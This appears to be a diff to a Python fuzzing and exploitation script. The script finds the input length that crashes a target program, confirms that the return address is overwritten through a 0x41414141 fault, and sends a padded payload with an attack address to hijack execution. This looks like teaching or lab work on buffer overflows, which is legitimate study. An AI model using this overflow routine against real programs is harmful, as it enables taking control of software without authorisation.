@@ -29,7 +29,7 @@ def find_min_bad_len(fuzz_file, fuzzed_program, mutations, input_from_file,detai
     inp = ""
     min_bad_inp=inp
     broken=0
-    for i in range(1,mutations):
+    for i in range(0,mutations):
         inp = inp + 'A'
         curr_len = len(inp)
         # create files and keep feeding them into the system
@@ -52,13 +52,13 @@ def find_min_bad_len(fuzz_file, fuzzed_program, mutations, input_from_file,detai
                 min_bad_inp=curr_len.to_bytes(4, 'big')+bytes(inp, 'utf-8')
                 broken=1
                 if detailed_log:
-                    print(i, f"crushed the system with inp={repr(inp)} and len=", curr_len)
+                    print(f"Run {i} crushed the system with inp={repr(inp)} and len=", curr_len)
             fault_addr=sig_fault_addr()    
             if fault_addr== '0x41414141':
                 len_to_reach_return_addr=curr_len-4
                 break
     print(f"The minimum bad len input that was found is {min_bad_len} + the 4 leading bytes representing the length of the buffer")
-    print("A generic input that would cause the system to fail could look like this:")
+    print("A generic input that would reach the return address could look like this:")
     print(min_bad_inp)
     return len_to_reach_return_addr
 
@@ -81,31 +81,29 @@ def attack_system(len_to_reach_return_addr, fuzzed_program, fuzz_file, attack_ad
             print(attack_len)
             print(attack_string)
         output, return_code = cmd_line_call(fuzzed_program, fuzz_file)
+        print(output)
         if detailed_log:
-            print(output)
             print("Return code=", return_code)
     else:
         inp=len_to_reach_return_addr*b"A"
         inp=inp+attack_address
-        attack_len=(len_to_reach_return_addr + 4)
         if detailed_log:
             print("NOW WE ATTACK")
             print("This is our weapon ", inp)
         subprocess.call([fuzzed_program,inp])
-        
+    attack_len=(len_to_reach_return_addr + 4)    
     return attack_len
 
 
 #Attempt to break the system while the system reads the input feeding it extremely large strings
-def break_system_before_return(len_to_reach_return_addr, fuzzed_program, fuzz_file, input_from_file,detailed_log):
-   # +4 to overwrite the return address
-    inp = b'A' * (len_to_reach_return_addr + 4)
+def break_system_before_return(attack_len, fuzzed_program, fuzz_file, input_from_file,detailed_log):
+    inp = b'A' * attack_len
     i=1
     gb=10_000_000_000
     fault_addr='0x41414141'
     while i<gb and fault_addr== '0x41414141':
         inp = inp + i*b'A'
-        curr_len = len_to_reach_return_addr+4+i
+        curr_len = attack_len+i
         # create files and keep feeding them into the system
         if input_from_file:
             file = open(fuzz_file, 'wb')
@@ -136,6 +134,7 @@ def break_system_before_return(len_to_reach_return_addr, fuzzed_program, fuzz_fi
         print("The attack buffer can be at least 1 GB in size")
     else:
         print(f"The attack buffer can be at least {int(i/10)} bytes in size")
+    return i/10
 
 #Make the address big endian
 #returns a normal view of the address into a string form
